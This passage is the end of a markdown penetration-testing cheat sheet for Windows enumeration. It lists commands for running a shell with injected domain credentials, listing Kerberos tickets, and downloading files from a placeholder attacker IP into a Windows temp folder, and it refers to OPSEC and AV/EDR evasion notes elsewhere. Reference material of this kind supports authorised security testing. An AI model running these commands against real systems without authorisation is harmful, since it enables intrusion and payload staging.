| Inject creds (no DJ) | `runas /netonly /user:<DOMAIN>\<USER> powershell.exe` | No domain-join needed |
| Ticket cache | `klist tickets` | Built-in |
| Web download | `curl.exe http://<IP>/file -o C:\Windows\Temp\file` | Win10 1803+ |
| Web download (PS) | `iwr http://<IP>/file -OutFile C:\Windows\Temp\file` | Any modern Windows |

> See per-phase sections above for full context, OPSEC notes, and AV/EDR caveats. Cross-reference [windows-methodology.md](windows-methodology.md), [active-directory-methodology.md](active-directory-methodology.md), and [file-transfers.md](file-transfers.md) for chained workflows.

[Back to top](#enumeration--information-gathering-methodology)

